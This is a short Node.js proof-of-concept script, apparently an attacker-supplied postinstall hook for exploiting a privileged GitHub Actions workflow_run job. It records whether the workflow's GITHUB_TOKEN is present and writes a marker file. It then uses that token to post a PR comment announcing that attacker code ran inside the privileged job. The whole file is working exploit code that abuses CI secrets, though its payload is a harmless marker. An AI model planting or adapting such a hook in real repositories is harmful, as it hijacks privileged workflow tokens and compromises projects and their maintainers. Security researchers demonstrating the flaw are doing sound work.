const fs = require('fs');
const path = require('path');
const ws = process.env.GITHUB_WORKSPACE || process.cwd();
const line = 'RCE_PROOF_IN_EXACT_TARGET_WORKFLOW token_present=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no') + ' repo=' + (process.env.GITHUB_REPOSITORY || 'none') + ' cwd=' + process.cwd();
if (process.env.GITHUB_STEP_SUMMARY) fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, line + '\n');
fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed');
(async () => {
  let pr = '';
  try { pr = fs.readFileSync(path.join(ws, 'pr-number.txt'), 'utf8').trim(); } catch (e) { pr = ''; }
  let status = 'no-pr';
  if (pr) {
    try {
      const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments', {
        method: 'POST',
        headers: { authorization: 'Bearer ' + process.env.GITHUB_TOKEN, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
        body: JSON.stringify({ body: 'RCE_PROOF_IN_EXACT_TARGET_WORKFLOW - attacker postinstall ran inside the privileged workflow_run job using the workflow GITHUB_TOKEN (PR ' + pr + ').' })
      });
      status = 'http_' + r.status;
    } catch (e) { status = 'error_' + e.message; }
  }
  if (process.env.GITHUB_STEP_SUMMARY) fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, 'token_comment=' + status + '\n');
  fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed comment=' + status);
})();
